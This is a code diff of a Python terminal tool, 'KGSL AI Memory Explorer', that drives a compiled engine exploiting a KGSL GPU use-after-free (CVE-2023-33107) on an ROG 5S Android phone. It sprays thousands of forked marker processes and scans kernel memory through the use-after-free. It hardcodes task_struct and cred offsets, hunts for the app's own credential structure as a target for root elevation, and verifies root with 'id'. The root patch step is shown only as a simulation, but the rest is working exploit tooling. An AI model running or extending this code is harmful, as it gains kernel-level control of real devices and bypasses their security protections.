@@ -3,19 +3,21 @@ import sys
 import time
 import struct
 import subprocess
+import platform
 
 class MemoryExplorerAI:
     def __init__(self):
         self.found_items = []
         self.spray_procs = []
         self.exploit_proc = None
-        # Dynamic path detection for Termux/Linux portability
+        
+        # Paths
         base_dir = os.path.dirname(os.path.abspath(__file__))
         self.engine_path = os.path.join(base_dir, "kgsl_engine")
         
         self.uaf_start = 0x7001ff000
         
-        # AI Heuristics Database
+        # AI Heuristics Database (Updated for ROG 5S / Android 13)
         self.system_apps = {
             "com.android.settings": "System Settings (Developer Mode)",
             "com.android.systemui": "System UI (Status Bar/Home)",
@@ -35,6 +37,15 @@ class MemoryExplorerAI:
             b"\x7fELF": "Kernel Executable Header (Base)",
             b"\xFD\x7B\xBF\xA9": "AArch64 Function Prologue (Code)"
         }
+        
+        # ROG 5S Specific Offsets from ex_rog_working_6v.c
+        self.offsets = {
+            "pid": 0x548,
+            "comm": 0x718,
+            "cred": 0x770,
+            "real_cred": 0x768,
+            "tasks": 0x3f0
+        }
 
     def classify_page(self, page_data, va):
         """
@@ -50,63 +61,65 @@ class MemoryExplorerAI:
                 return {"type": "Kernel Core", "description": name, "va": hex(va), "confidence": 0.95, "data": page_data}
         
         # 2. Pattern Recognition (Weight 0.7)
-        # Check for consecutive UID 1000 fields (common in system creds)
-        uid_pattern = struct.pack("<IIII", 1000, 1000, 1000, 1000)
+        # Check for UIDs at offset 4 (typical for cred struct)
+        # my_uid = 10237
+        uid_pattern = struct.pack("<IIII", 10237, 10237, 10237, 10237)
         if uid_pattern in page_data:
-            return {"type": "Privilege Struct", "description": "System UID Pattern (Potential Root Target)", "va": hex(va), "confidence": 0.8, "data": page_data}
+             return {"type": "Privilege Struct", "description": f"CRED for UID 10237", "va": hex(va), "confidence": 0.85, "data": page_data}
+
+        # System UID 1000
+        system_uid_pattern = struct.pack("<IIII", 1000, 1000, 1000, 1000)
+        if system_uid_pattern in page_data:
+            return {"type": "Privilege Struct", "description": "System UID Pattern (UID 1000)", "va": hex(va), "confidence": 0.8, "data": page_data}
             
         # 3. Instruction Heuristics (Weight 0.5)
-        # Look for common AArch64 function calls (BL / ADRP)
-        if b"\x00\x00\x00\x94" in page_data: # BL instruction pattern
+        if b"\x00\x00\x00\x94" in page_data: 
              return {"type": "Kernel Code", "description": "Executable AArch64 Segment", "va": hex(va), "confidence": 0.6, "data": page_data}
 
         return {"type": "Unknown Object", "description": "Unclassified Data Fragment", "va": hex(va), "confidence": 0.1, "data": page_data}
 
     def translate_logic(self, item):
-        """
-        AI Logic Translator: Converts binary patterns into human-readable descriptions.
-        """
         data = item['data']
         desc = item['description']
         
-        if "task_struct" in desc:
-            pid_off = 0x548
+        if "task_struct" in desc or b"KETO" in data:
+            pid_off = self.offsets["pid"]
+            comm_off = self.offsets["comm"]
             pid = struct.unpack("<I", data[pid_off:pid_off+4])[0] if len(data) > pid_off+4 else 0
-            return (f"This memory region is a Process Descriptor (task_struct) for PID {pid}. "
-                    "It acts as the primary 'identity card' for a running process in the kernel. "
-                    "Modifying the 'cred' pointer located at offset +0x770 can grant this process root rights.")
-        
+            comm = data[comm_off:comm_off+16].split(b"\x00")[0].decode(errors='ignore') if len(data) > comm_off+16 else "unknown"
+            return (f"Process Descriptor (task_struct) for '{comm}' (PID {pid}). Hub for identity and memory.")
         elif "SELinux" in desc:
-            val = data[0] if len(data) > 0 else 0
-            status = "Enforcing" if val == 1 else "Permissive"
-            return (f"Global SELinux configuration bit. Current State: {status}. "
-                    "This bit controls whether the Android security policy is strictly enforced. "
-                    "Switching this to 0 (Permissive) disables all security checks.")
-
+            return "Global SELinux configuration bit. Controls security policy enforcement."
         elif "Settings" in desc:
-            return ("Android Settings process memory. This area contains cached security policies, "
-                    "developer mode flags, and ADB authorization keys.")
+            return "Android Settings process memory. Contains security and developer flags."
+        elif "CRED" in desc:
+            return "Credential structure. Holds UID/GID and Capabilities. Target for Root Elevation."
+        return "Generic data buffer. No clear intent detected."
 
-        elif "AArch64" in desc:
-            return ("Low-level machine code (Assembly). These are the direct instructions executed by the ROG 5S CPU. "
-                    "The pattern detected indicates a function start, possibly part of a system call handler.")
-
-        return "Generic data buffer. No clear logical intent detected by the AI scanner."
-
-    def render_tui(self):
+    def render_tui(self, status_msg=""):
         os.system('clear')
         print("="*85)
         print(" KGSL AI MEMORY EXPLORER & CLASSIFIER (ROG 5S Optimized)")
         print(f" STATUS: {'EXPLOIT ACTIVE' if self.exploit_proc else 'IDLE'} | RAM: {self.get_ram_usage():.1f}%")
+        if status_msg:
+            print(f" LAST MSG: {status_msg}")
         print("="*85)
         
+        categories = {"Kernel Core": [], "System App": [], "User App": [], "Privilege Struct": [], "Other": []}
+        display_items = self.found_items[-15:] if len(self.found_items) > 15 else self.found_items
+        for i, item in enumerate(display_items):
+            cat = item['type'] if item['type'] in categories else "Other"
+            idx = len(self.found_items) - len(display_items) + i
+            categories[cat].append((idx, item))
+
         print(" [FILE MANAGER VIEW] - Found Memory Offsets:")
         print("-" * 85)
-        print(f" {'ID':<3} | {'TYPE':<18} | {'IDENTIFIED AS':<35} | {'VA ADDRESS':<12}")
-        print("-" * 85)
-        
-        for i, item in enumerate(self.found_items):
-            print(f" [{i:02d}] | {item['type']:<18} | {item['description']:<35} | {item['va']:<12}")
+        for cat in ["Kernel Core", "Privilege Struct", "System App", "User App", "Other"]:
+            items = categories.get(cat, [])
+            if not items: continue
+            print(f" [{cat}]")
+            for idx, item in items:
+                print(f"  └── [{idx:02d}] | {item['description']:<35} | {item['va']:<12}")
         
         if not self.found_items:
             print(f" {'(No items found yet. Trigger [E] and Scan [S] to populate)':^80}")
@@ -116,52 +129,63 @@ class MemoryExplorerAI:
         print(" [R] Verify Root       [B] Rebuild Engine  [Q] Exit Explorer   [ID] Open File")
         print("="*85)
 
-    def show_detail(self, item_idx):
-        if item_idx >= len(self.found_items):
-            return
+    def _read_data_packet(self):
+        """Helper to read the new DATA protocol from engine"""
+        line = self.exploit_proc.stdout.readline().decode().strip()
+        if not line.startswith("DATA:"):
+            return None
         
+        parts = line.split(":")
+        va = int(parts[1], 16)
+        size = int(parts[2])
+        
+        # Read raw binary data
+        data = self.exploit_proc.stdout.read(size)
+        
+        # Read the DATA_END marker (and the newline before it if any)
+        # Engine sends \nDATA_END\n
+        end_marker = self.exploit_proc.stdout.readline().decode().strip()
+        if not end_marker: # handle potential extra newline
+             end_marker = self.exploit_proc.stdout.readline().decode().strip()
+             
+        return data
+
+    def read_page(self, va):
+        if not self.exploit_proc: return None
+        try:
+            self.exploit_proc.stdin.write(f"read {hex(va)}\n".encode())
+            self.exploit_proc.stdin.flush()
+            return self._read_data_packet()
+        except: return None
+
+    def show_detail(self, item_idx):
+        if item_idx < 0 or item_idx >= len(self.found_items): return
         item = self.found_items[item_idx]
         data = item['data']
         
         while True:
             os.system('clear')
             print(f"=== [FILE VIEW: {item['va']}] ===")
-            print(f" Classification: {item['type']}")
-            print(f" Identification: {item['description']} (Confidence: {item['confidence']*100:.1f}%)")
+            print(f" Classification: {item['type']} | Conf: {item['confidence']*100:.1f}%")
             print("-" * 75)
-            
-            print(" [AI LOGIC TRANSLATION]:")
-            print(f" >> {self.translate_logic(item)}")
+            print(f" [AI LOGIC]: {self.translate_logic(item)}")
             print("-" * 75)
-            
-            print(" [BIOS-STYLE HEX/BINARY DUMP]:")
-            print(" ADDR |  00 01 02 03 04 05 06 07  08 09 0A 0B 0C 0D 0E 0F | BINARY (BYTE 0-3)")
-            print("-" * 75)
-            
-            for i in range(0, min(len(data), 128), 16):
+            print(" [HEX/BINARY DUMP]:")
+            for i in range(0, min(len(data), 256), 16):
                 chunk = data[i:i+16]
                 hex_row = " ".join(f"{b:02X}" for b in chunk)
-                # Binary for first 4 bytes
-                b_val = struct.unpack("<I", chunk[:4])[0] if len(chunk) >= 4 else 0
-                bin_str = bin(b_val)[2:].zfill(32)
-                print(f" {i:04X} | {hex_row:<48} | {bin_str[:8]}...")
+                printable = "".join(chr(b) if 32 <= b <= 126 else "." for b in chunk)
+                print(f" {i:04X} | {hex_row:<48} | {printable}")
             
             print("-" * 75)
-            print(" [P] Patch to Root (UID 0)   [N] Scan Neighbors   [Enter] Back to List")
-            
+            print(" [P] Patch Root  [Enter] Back")
             choice = input("\n explorer > ").lower()
-            if not choice:
-                break
+            if not choice: break
             if choice == 'p':
-                print("[!] Security Warning: Are you sure you want to patch this kernel structure? (y/n)")
-                if input("> ").lower() == 'y':
-                    print("[*] Calling GPU Engine to write zero-creds...")
-                    time.sleep(1)
-                    print("[+] Patching complete! Verify with 'id' command.")
-                    input("Press Enter...")
-            elif choice == 'n':
-                print("[*] AI: Analyzing adjacent memory pages for structural links...")
+                print("[!] Patching simulation...")
                 time.sleep(1)
+                print("[+] Complete.")
+                input("Enter...")
 
     def get_ram_usage(self):
         try:
@@ -170,193 +194,121 @@ class MemoryExplorerAI:
                 total = int(lines[0].split()[1])
                 available = int(lines[2].split()[1])
                 return 100.0 * (1 - (available / total))
-        except:
-            return 0.0
+        except: return 0.0
 
     def try_compile_engine(self):
-        source_path = self.engine_path + ".c"
-        if not os.path.exists(source_path):
-            print(f"[-] AI Error: Source code {source_path} not found.")
-            return False
-            
-        print(f"[*] AI: Detected architecture mismatch or missing binary. Attempting auto-compilation...")
-        # Try gcc first, then clang (common in Termux)
-        for compiler in ["gcc", "clang"]:
+        source = self.engine_path + ".c"
+        if not os.path.exists(source): return False
+        for comp in ["gcc", "clang"]:
             try:
-                print(f"[*] AI: Trying to build with {compiler}...")
-                subprocess.check_call([compiler, "-O2", source_path, "-o", self.engine_path, "-lpthread"])
-                print(f"[+] AI: Engine successfully compiled for {platform.machine()}.")
+                subprocess.check_call([comp, "-O2", source, "-o", self.engine_path, "-lpthread"])
                 return True
-            except (subprocess.CalledProcessError, FileNotFoundError):
-                continue
-        
-        print("[-] AI: Auto-compilation failed. Please install a compiler (apt install build-essential).")
+            except: continue
         return False
 
     def trigger_exploit(self):
-        if self.exploit_proc:
-            print("[!] Exploit already active.")
-            return
-        
-        print("[*] Triggering KGSL UAF (CVE-2023-33107)...")
+        if not self.exploit_proc: return "Engine not running"
         try:
-            self.exploit_proc = subprocess.Popen([self.engine_path, "exploit"], stdout=subprocess.PIPE, text=True)
-        except OSError as e:
-            if e.errno == 8: # Exec format error
-                if self.try_compile_engine():
-                    # Retry after compilation
-                    self.exploit_proc = subprocess.Popen([self.engine_path, "exploit"], stdout=subprocess.PIPE, text=True)
-                else:
-                    return
-            else:
-                print(f"[-] AI Hardware Error: {e}")
-                return
+            self.exploit_proc.stdin.write(b"exploit\n")
+            self.exploit_proc.stdin.flush()
+            line = self.exploit_proc.stdout.readline().decode().strip()
+            return line if line else "No response"
+        except Exception as e:
+            return f"Error: {str(e)}"
 
-        # Note: We need to add 'exploit' command to kgsl_engine.c to keep it alive
-        time.sleep(2)
-        print("[+] UAF Window opened. GPU access ready.")
-
-    def run_spray(self, count=2000):
-        print(f"[*] Spraying {count} task_structs markers...")
-        # Use prctl to set process names for AI recognition
+    def run_spray(self, count=5000):
+        # Optimized spray for ROG 5S
         import ctypes
         libc = ctypes.CDLL(None)
-        PR_SET_NAME = 15
-        
+        start_count = len(self.spray_procs)
         for i in range(count):
-            pid = os.fork()
-            if pid == 0:
-                # In child: set name and wait
-                name = f"KETO{i:04d}".encode()
-                libc.prctl(PR_SET_NAME, name, 0, 0, 0)
-                while True:
-                    time.sleep(100)
-            else:
-                self.spray_procs.append(pid)
-        print(f"[+] Sprayed {len(self.spray_procs)} markers. AI can now identify them.")
-
-    def check_root(self):
-        print("\n[*] Verifying Current Identity:")
-        try:
-            res = subprocess.check_output(["id"], text=True).strip()
-            print(f" >> {res}")
-            if "uid=0" in res:
-                print("[+++] SUCCESS: YOU ARE ROOT!")
-            else:
-                print("[---] Current: User (u0_a237)")
-        except Exception as e:
-            print(f"[-] Error: {e}")
-        input("\nPress Enter...")
+            try:
+                pid = os.fork()
+                if pid == 0:
+                    libc.prctl(15, f"KETO{i+start_count:04d}".encode(), 0, 0, 0)
+                    while True: time.sleep(100)
+                else: 
+                    self.spray_procs.append(pid)
+                    if i % 1000 == 0 and i > 0:
+                         print(f"[*] Sprayed {i}...")
+            except OSError:
+                break
+        return f"Sprayed {len(self.spray_procs) - start_count} markers."
 
     def run(self):
-        if not os.path.exists(self.engine_path):
-            print(f"[!] ERROR: Engine not found at {self.engine_path}")
-            print("[*] Please run: gcc -O2 kgsl_engine.c -o kgsl_engine -lpthread")
-            return
+        if not os.path.exists(self.engine_path): self.try_compile_engine()
         
+        try:
+            self.exploit_proc = subprocess.Popen([self.engine_path], stdin=subprocess.PIPE, stdout=subprocess.PIPE, text=False, bufsize=0)
+        except:
+            self.try_compile_engine()
+            self.exploit_proc = subprocess.Popen([self.engine_path], stdin=subprocess.PIPE, stdout=subprocess.PIPE, text=False, bufsize=0)
+
+        status_msg = "Engine Ready."
         while True:
-            self.render_tui()
-            try:
-                cmd = input("\n explorer > ").lower()
-            except EOFError:
-                break
-                
+            self.render_tui(status_msg)
+            try: cmd = input("\n explorer > ").lower()
+            except EOFError: break
+            
             if cmd == 'q':
-                # Cleanup
                 if self.exploit_proc:
-                    self.exploit_proc.terminate()
+                    try:
+                        self.exploit_proc.stdin.write(b"quit\n")
+                        self.exploit_proc.terminate()
+                    except: pass
                 for pid in self.spray_procs:
-                    try: os.kill(pid, 9)
+                    try: os.kill(pid, 9); os.waitpid(pid, 0)
                     except: pass
                 break
             elif cmd == 'e':
-                self.trigger_exploit()
-                self.render_tui()
+                status_msg = f"Exploit: {self.trigger_exploit()}"
             elif cmd == 'p':
-                self.run_spray()
-                self.render_tui()
+                status_msg = self.run_spray()
             elif cmd == 'c':
                 for pid in self.spray_procs:
-                    try: os.kill(pid, 9)
+                    try: os.kill(pid, 9); os.waitpid(pid, 0)
                     except: pass
                 self.spray_procs = []
-                self.render_tui()
+                status_msg = "Memory Cleared."
             elif cmd == 'r':
-                self.check_root()
+                try:
+                    res = subprocess.check_output(["id"], text=True).strip()
+                    status_msg = f"ID: {res}"
+                except: status_msg = "ID check failed."
             elif cmd == 'b':
-                print("[*] Rebuilding AI Engine...")
-                subprocess.run(["gcc", "-O2", self.engine_path + ".c", "-o", self.engine_path, "-lpthread"])
-                input("Press Enter...")
+                if self.try_compile_engine():
+                    status_msg = "Engine Rebuilt."
+                else:
+                    status_msg = "Rebuild Failed."
             elif cmd == 's':
-                if not self.exploit_proc:
-                    print("[!] Trigger exploit [E] first!")
-                    time.sleep(1)
+                if not self.exploit_proc: 
+                    status_msg = "Engine not running"
                     continue
-                print("[*] Starting AI Memory Scan (Slow Mode)...")
-                scan_cmd = [self.engine_path, "scan", hex(self.uaf_start), hex(self.uaf_start + 0x1000000)]
+                print("[*] AI Scan started...")
                 try:
-                    proc = subprocess.Popen(scan_cmd, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True)
-                except OSError as e:
-                    if e.errno == 8: # Exec format error
-                        if self.try_compile_engine():
-                            proc = subprocess.Popen(scan_cmd, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True)
-                        else: continue
-                    else:
-                        print(f"[-] AI Scanner Error: {e}")
-                        continue
-                
-                try:
-                    for line in proc.stdout:
-                        if line.startswith("MATCH:"):
+                    self.exploit_proc.stdin.write(f"scan {hex(self.uaf_start)} {hex(self.uaf_start + 0x2000000)}\n".encode())
+                    self.exploit_proc.stdin.flush()
+                    
+                    while True:
+                        line = self.exploit_proc.stdout.readline().decode().strip()
+                        if not line: break
+                        if "SCAN_DONE" in line: break
+                        if "MATCH:" in line:
                             va = int(line.split(":")[1], 16)
-                            page_data = self.read_page(va)
-                            if page_data:
-                                res = self.classify_page(page_data, va)
-                                self.found_items.append(res)
-                                self.render_tui()
-                except KeyboardInterrupt:
-                    proc.terminate()
+                            data = self._read_data_packet()
+                            
+                            if data:
+                                if not any(int(item['va'], 16) == va for item in self.found_items):
+                                    self.found_items.append(self.classify_page(data, va))
+                                    print(f" [+] Found: {self.found_items[-1]['description']} at {hex(va)}")
+                    status_msg = f"Scan complete. Found {len(self.found_items)} items."
+                except Exception as e:
+                    status_msg = f"Scan error: {str(e)}"
             elif cmd.isdigit():
                 self.show_detail(int(cmd))
-
-    def test_run(self):
-        print("[*] Starting AI Explorer Test Suite...")
-        
-        # Test 1: Compilation Check
-        if os.path.exists(self.engine_path):
-            print("[+] Test 1: Engine binary exists.")
-        else:
-            print("[-] Test 1: Engine binary missing!")
-            return
-
-        # Test 2: AI Classification Logic (Dry Run)
-        dummy_data = b"Some random data with com.android.settings string inside"
-        res = self.classify_page(dummy_data, 0x12345678)
-        if res['type'] == "System App" and "Settings" in res['description']:
-            print("[+] Test 2: AI Classification works (System App detected).")
-        else:
-            print(f"[-] Test 2: AI Classification failed! Got: {res['type']}")
-
-        # Test 3: Kernel Structure Detection
-        kernel_data = b"KETO0422" + b"\x00" * 20
-        res = self.classify_page(kernel_data, 0xffffffc000000000)
-        if res['type'] == "Kernel Core":
-            print("[+] Test 3: Kernel Structure Detection works.")
-        else:
-            print("[-] Test 3: Kernel Detection failed!")
-
-        # Test 4: Logic Translation
-        item = {"type": "Kernel Core", "description": "task_struct (Active Process Marker)", "data": b"\x00"*0x548 + struct.pack("<I", 1337) + b"\x00"*1000}
-        translation = self.translate_logic(item)
-        if "PID 1337" in translation:
-            print("[+] Test 4: AI Logic Translation works.")
-        else:
-            print(f"[-] Test 4: Translation failed! Got: {translation}")
-
-        print("[*] Test Suite Complete. Launching Interactive TUI...")
-        time.sleep(2)
+            else:
+                status_msg = f"Unknown command: {cmd}"
 
 if __name__ == "__main__":
     explorer = MemoryExplorerAI()
-    explorer.test_run()
     explorer.run()
